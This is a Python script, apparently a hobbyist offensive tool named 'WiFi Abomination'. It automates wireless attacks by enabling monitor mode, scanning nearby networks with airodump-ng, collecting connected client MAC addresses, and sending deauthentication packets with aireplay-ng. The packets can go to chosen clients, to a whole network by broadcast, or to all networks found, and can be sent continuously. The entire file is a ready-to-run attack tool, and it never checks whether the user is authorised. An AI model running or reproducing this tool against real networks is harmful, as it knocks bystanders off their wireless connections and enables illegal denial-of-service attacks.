# -*- coding: utf-8 -*-

import os
import subprocess
import csv
import signal
import time
import ctypes
import sys
import glob
import re

print('''

██╗    ██╗██╗███████╗██╗                                                                
██║    ██║██║██╔════╝██║                                                                
██║ █╗ ██║██║█████╗  ██║                                                                
██║███╗██║██║██╔══╝  ██║                                                                
╚███╔███╔╝██║██║     ██║                                                                
╚══╝╚══╝ ╚═╝╚═╝     ╚═╝                                                                
                                                                                        
█████╗ ██████╗  ██████╗ ███╗   ███╗██╗███╗   ██╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██╔══██╗██╔══██╗██╔═══██╗████╗ ████║██║████╗  ██║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
███████║██████╔╝██║   ██║██╔████╔██║██║██╔██╗ ██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
██╔══██║██╔══██╗██║   ██║██║╚██╔╝██║██║██║╚██╗██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
██║  ██║██████╔╝╚██████╔╝██║ ╚═╝ ██║██║██║ ╚████║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
                                                                                        
made by ssskingsss12 

use with caution
''')

# Constants
MENU_OPTIONS = {
    "1": "Enable Monitor Mode",
    "2": "Scan Networks",
    "3": "Monitor Networks for Clients",
    "4": "Load Scan File",
    "5": "Deauth Attack",
    "6": "Exit",
}

# Global variables
monitor_adapter = None
current_scan_file = None
scan_data = {'networks': []}

def signal_handler(sig, frame):
    print("\n\n[+] Returning to menu...")
    raise KeyboardInterrupt

def run_command(command):
    """Run command and return output"""
    try:
        process = subprocess.Popen(command, shell=True, 
                                  stdout=subprocess.PIPE, 
                                  stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        return stdout.strip(), stderr.strip()
    except Exception as e:
        return "", str(e)

def get_adapter_mode(interface):
    """Get current mode of a wireless adapter"""
    output, _ = run_command("iw dev {} info".format(interface))
    for line in output.splitlines():
        if "type" in line:
            mode = line.split()[-1]
            return mode
    return "unknown"

def list_network_adapters():
    """List all wireless adapters"""
    adapters = []
    output, _ = run_command("iw dev")
    if output:
        current_interface = None
        for line in output.splitlines():
            if line.strip().startswith("Interface"):
                current_interface = line.split()[1]
            elif "type" in line and current_interface:
                mode = line.split()[-1]
                adapters.append((current_interface, mode))
                current_interface = None
    return adapters

def check_for_monitor_adapter():
    """Auto detect monitor mode adapter"""
    global monitor_adapter
    adapters = list_network_adapters()
    for name, mode in adapters:
        if mode == "monitor":
            monitor_adapter = name
            print("[+] Found adapter in monitor mode: {}".format(monitor_adapter))
            return True
    print("[!] No adapters found in monitor mode.")
    return False

def enable_monitor_mode():
    """Enable monitor mode"""
    global monitor_adapter
    
    adapters = list_network_adapters()
    if not adapters:
        print("[!] No wireless adapters found.")
        return False
    
    print("\n[+] Available wireless adapters:")
    for i, (name, mode) in enumerate(adapters, start=1):
        print("    {}. {} (Mode: {})".format(i, name, mode))
    
    try:
        choice = int(raw_input("\nSelect adapter: ").strip())
        if choice < 1 or choice > len(adapters):
            print("[!] Invalid choice.")
            return False
        
        adapter = adapters[choice - 1][0]
        
        print("[+] Enabling monitor mode on {}...".format(adapter))
        run_command("sudo ip link set {} down".format(adapter))
        run_command("sudo iw dev {} set type monitor".format(adapter))
        run_command("sudo ip link set {} up".format(adapter))
        
        monitor_adapter = adapter
        print("[+] Monitor mode enabled on {}".format(adapter))
        return True
        
    except:
        print("[!] Invalid input.")
        return False

def scan_networks():
    """Initial scan to find networks"""
    global monitor_adapter
    
    if not monitor_adapter:
        print("[!] No adapter in monitor mode!")
        return
    
    print("\n[+] Scanning for networks (30 seconds)...")
    print("[+] Press Ctrl+C to stop\n")
    
    filename = "networks"
    cmd = "sudo airodump-ng {} -w {} --output-format csv".format(monitor_adapter, filename)
    
    process = subprocess.Popen(cmd, shell=True)
    
    for i in range(30, 0, -1):
        sys.stdout.write("\r[+] Time remaining: {} seconds".format(i))
        sys.stdout.flush()
        time.sleep(1)
    
    print("\n")
    process.terminate()
    time.sleep(2)
    
    csv_files = glob.glob("networks-*.csv")
    if not csv_files:
        print("[!] No scan results found!")
        return
    
    networks = []
    with open(csv_files[0], 'r') as f:
        reader = csv.reader(f)
        for row in reader:
            if row and len(row) >= 14:
                first_col = row[0].strip()
                if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', first_col):
                    bssid = first_col
                    channel = row[3].strip()
                    signal = row[8].strip()
                    ssid = row[13].strip()
                    
                    networks.append({
                        'bssid': bssid,
                        'ssid': ssid if ssid else "Hidden",
                        'channel': channel,
                        'signal': signal,
                        'clients': []
                    })
    
    if not networks:
        print("[!] No networks found!")
        return
    
    with open("networks_list.csv", 'w') as f:
        f.write("BSSID,SSID,Channel,Signal\n")
        for net in networks:
            f.write("{},{},{},{}\n".format(
                net['bssid'], net['ssid'], net['channel'], net['signal']))
    
    print("\n[+] Found {} networks".format(len(networks)))
    for i, net in enumerate(networks[:15], 1):
        print("    {}. {} - Ch:{}".format(i, net['ssid'][:25], net['channel']))
    
    print("\n[+] Networks saved to networks_list.csv")
    
    for f in csv_files:
        try:
            os.remove(f)
        except:
            pass

def monitor_networks_for_clients():
    """Monitor each network individually to capture clients"""
    global monitor_adapter, current_scan_file, scan_data
    
    if not monitor_adapter:
        print("[!] No adapter in monitor mode!")
        return
    
    if not os.path.exists("networks_list.csv"):
        print("[!] No networks_list.csv found!")
        print("    Please run Option 2 first")
        return
    
    networks = []
    with open("networks_list.csv", 'r') as f:
        lines = f.readlines()[1:]
        for line in lines:
            parts = line.strip().split(',')
            if len(parts) >= 4:
                networks.append({
                    'bssid': parts[0].strip(),
                    'ssid': parts[1].strip(),
                    'channel': parts[2].strip(),
                    'signal': parts[3].strip(),
                    'clients': []
                })
    
    if not networks:
        print("[!] No networks found!")
        return
    
    print("\n[+] Found {} networks to monitor".format(len(networks)))
    
    try:
        monitor_time = int(raw_input("[+] Seconds per network (default 10): ").strip())
        if monitor_time < 5:
            monitor_time = 10
    except:
        monitor_time = 10
    
    confirm = raw_input("\nStart monitoring? (y/n): ").strip().lower()
    if confirm != 'y':
        return
    
    for idx, net in enumerate(networks, 1):
        print("\n[{}/{}] Monitoring: {}".format(idx, len(networks), net['ssid']))
        print("    BSSID: {}".format(net['bssid']))
        print("    Channel: {}".format(net['channel']))
        
        filename = "client_{}".format(net['bssid'].replace(':', ''))
        cmd = "sudo airodump-ng --bssid {} -c {} {} -w {}".format(
            net['bssid'], net['channel'], monitor_adapter, filename)
        
        process = subprocess.Popen(cmd, shell=True)
        
        clients_found = []
        for i in range(monitor_time, 0, -1):
            sys.stdout.write("\r    Time remaining: {} seconds - Clients: {}".format(i, len(clients_found)))
            sys.stdout.flush()
            time.sleep(1)
        
        print("\n")
        process.terminate()
        time.sleep(2)
        
        csv_files = glob.glob("{}*.csv".format(filename))
        if csv_files:
            with open(csv_files[0], 'r') as f:
                reader = csv.reader(f)
                in_clients = False
                for row in reader:
                    if row and len(row) > 0:
                        if 'Station MAC' in row[0]:
                            in_clients = True
                            continue
                        if in_clients and row and len(row) >= 1:
                            client_mac = row[0].strip()
                            if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', client_mac):
                                if client_mac not in clients_found:
                                    clients_found.append(client_mac)
            
            net['clients'] = clients_found
            print("    Found {} clients".format(len(clients_found)))
            for client in clients_found[:5]:
                print("        - {}".format(client))
        
        for f in csv_files:
            try:
                os.remove(f)
            except:
                pass
        for f in glob.glob("{}*.cap".format(filename)):
            try:
                os.remove(f)
            except:
                pass
    
    current_scan_file = "scan_data.csv"
    scan_data = {'networks': networks}
    
    with open(current_scan_file, 'w') as f:
        f.write("BSSID,SSID,Channel,Signal,Clients\n")
        for net in networks:
            clients_str = ";".join(net['clients']) if net['clients'] else "None"
            f.write("{},{},{},{},{}\n".format(
                net['bssid'], net['ssid'], net['channel'], net['signal'], clients_str))
    
    networks_with_clients = [n for n in networks if n['clients']]
    total_clients = sum(len(n['clients']) for n in networks)
    
    print("\n" + "="*50)
    print("[+] MONITORING COMPLETE")
    print("="*50)
    print("[+] Networks with clients: {}".format(len(networks_with_clients)))
    print("[+] Total clients found: {}".format(total_clients))
    print("[+] Data saved to {}".format(current_scan_file))

def load_scan_file():
    """Load existing scan file"""
    global current_scan_file, scan_data
    
    if os.path.exists("scan_data.csv"):
        current_scan_file = "scan_data.csv"
    else:
        csv_files = glob.glob("*.csv")
        if not csv_files:
            print("[!] No scan files found")
            return False
        current_scan_file = csv_files[0]
    
    try:
        networks = []
        with open(current_scan_file, 'r') as f:
            reader = csv.reader(f)
            next(reader)
            for row in reader:
                if len(row) >= 5:
                    bssid = row[0].strip()
                    ssid = row[1].strip()
                    channel = row[2].strip()
                    signal = row[3].strip()
                    clients_str = row[4].strip()
                    clients = clients_str.split(';') if clients_str != 'None' else []
                    networks.append({
                        'bssid': bssid,
                        'ssid': ssid,
                        'channel': channel,
                        'signal': signal,
                        'clients': clients
                    })
        
        scan_data = {'networks': networks}
        with_clients = sum(1 for n in networks if n['clients'])
        total_clients = sum(len(n['clients']) for n in networks)
        
        print("\n[+] Loaded {} networks".format(len(networks)))
        print("[+] Networks with clients: {}".format(with_clients))
        print("[+] Total clients: {}".format(total_clients))
        return True
        
    except Exception as e:
        print("[!] Error loading file: {}".format(e))
        return False

def deauth_attack():
    """Perform deauthentication attack"""
    global monitor_adapter, scan_data
    
    if not monitor_adapter:
        print("[!] No adapter in monitor mode!")
        return
    
    if not scan_data['networks']:
        print("[!] No scan data loaded!")
        return
    
    networks_with_clients = [n for n in scan_data['networks'] if n['clients']]
    
    if not networks_with_clients:
        print("\n[!] No networks with clients found!")
        return
    
    print("\n" + "="*50)
    print("[+] Networks with clients")
    print("="*50)
    
    for i, net in enumerate(networks_with_clients, 1):
        print("\n{}. {}".format(i, net['ssid']))
        print("   BSSID: {}".format(net['bssid']))
        print("   Channel: {}".format(net['channel']))
        print("   Clients: {}".format(len(net['clients'])))
        for client in net['clients'][:3]:
            print("      - {}".format(client))
    
    try:
        choice = raw_input("\nAttack (a=all, or number): ").strip()
        if not choice:
            return
        
        print("\n[+] Deauth options:")
        print("    1. Deauth specific clients (targeted)")
        print("    2. Deauth ALL clients on network (broadcast)")
        attack_type = raw_input("Choice (1 or 2): ").strip()
        
        print("\n[+] Number of deauth packets to send:")
        print("    0 = continuous (forever)")
        print("    1-20 = specific number")
        packets = raw_input("Packets (default 5): ").strip()
        packets = int(packets) if packets else 5
        
        if choice.lower() == 'a':
            print("\n[+] Attacking ALL networks...")
            print("[+] Press Ctrl+C to stop\n")
            
            for net in networks_with_clients:
                print("\n" + "="*50)
                print("[+] Network: {}".format(net['ssid']))
                print("[+] BSSID: {}".format(net['bssid']))
                
                if attack_type == '2':
                    print("[+] Sending broadcast deauth to ALL clients")
                    cmd = "sudo aireplay-ng --deauth {} -a {} {}".format(
                        packets, net['bssid'], monitor_adapter)
                    print("    Command: {}".format(cmd))
                    run_command(cmd)
                else:
                    for idx, client in enumerate(net['clients'], 1):
                        print("[{}/{}] Deauthing: {}".format(idx, len(net['clients']), client))
                        cmd = "sudo aireplay-ng --deauth {} -a {} -c {} {}".format(
                            packets, net['bssid'], client, monitor_adapter)
                        print("    Command: {}".format(cmd))
                        run_command(cmd)
                        time.sleep(0.3)
                
                print("[+] Completed: {}".format(net['ssid']))
                
        else:
            try:
                idx = int(choice) - 1
                if 0 <= idx < len(networks_with_clients):
                    net = networks_with_clients[idx]
                    
                    print("\n" + "="*50)
                    print("[+] TARGET: {}".format(net['ssid']))
                    print("[+] BSSID: {}".format(net['bssid']))
                    print("[+] Channel: {}".format(net['channel']))
                    
                    if attack_type == '2':
                        print("\n[+] Broadcast deauth - Will disconnect ALL clients")
                        confirm = raw_input("Start broadcast deauth? (y/n): ").strip().lower()
                        if confirm == 'y':
                            cmd = "sudo aireplay-ng --deauth {} -a {} {}".format(
                                packets, net['bssid'], monitor_adapter)
                            print("\n[+] Sending broadcast deauth...")
                            print("    Command: {}".format(cmd))
                            run_command(cmd)
                            print("[+] Attack completed!")
                    else:
                        print("\n[+] Clients to attack:")
                        for client in net['clients']:
                            print("    - {}".format(client))
                        
                        confirm = raw_input("\nStart targeted deauth? (y/n): ").strip().lower()
                        if confirm == 'y':
                            print("\n[+] Starting attack...")
                            for idx2, client in enumerate(net['clients'], 1):
                                print("[{}/{}] Deauthing: {}".format(idx2, len(net['clients']), client))
                                cmd = "sudo aireplay-ng --deauth {} -a {} -c {} {}".format(
                                    packets, net['bssid'], client, monitor_adapter)
                                print("    Command: {}".format(cmd))
                                run_command(cmd)
                                time.sleep(0.3)
                            print("\n[+] Attack completed!")
                else:
                    print("[!] Invalid selection")
                    
            except ValueError:
                print("[!] Invalid input")
                
    except KeyboardInterrupt:
        print("\n[+] Attack stopped by user")
    except Exception as e:
        print("[!] Error: {}".format(e))

def is_admin():
    return os.geteuid() == 0

def main():
    global monitor_adapter
    
    if not is_admin():
        print("[!] This script must be run as root!")
        return
    
    signal.signal(signal.SIGINT, signal_handler)
    check_for_monitor_adapter()
    
    while True:
        try:
            print("\n" + "="*50)
            print("WiFi Deauthentication Tool")
            print("="*50)
            print("Adapter: {}".format(monitor_adapter if monitor_adapter else "None"))
            if scan_data['networks']:
                clients = sum(len(n.get('clients', [])) for n in scan_data['networks'])
                print("Loaded: {} networks, {} clients".format(len(scan_data['networks']), clients))
            print("="*50)
            
            for key, value in MENU_OPTIONS.items():
                print("  {}: {}".format(key, value))
            
            choice = raw_input("\nChoice: ").strip()
            
            if choice == "1":
                enable_monitor_mode()
            elif choice == "2":
                scan_networks()
            elif choice == "3":
                monitor_networks_for_clients()
            elif choice == "4":
                load_scan_file()
            elif choice == "5":
                deauth_attack()
            elif choice == "6":
                print("\n[+] Exiting...")
                break
                
        except KeyboardInterrupt:
            print("\n[+] Returning to menu...")
            continue

if __name__ == "__main__":
    main()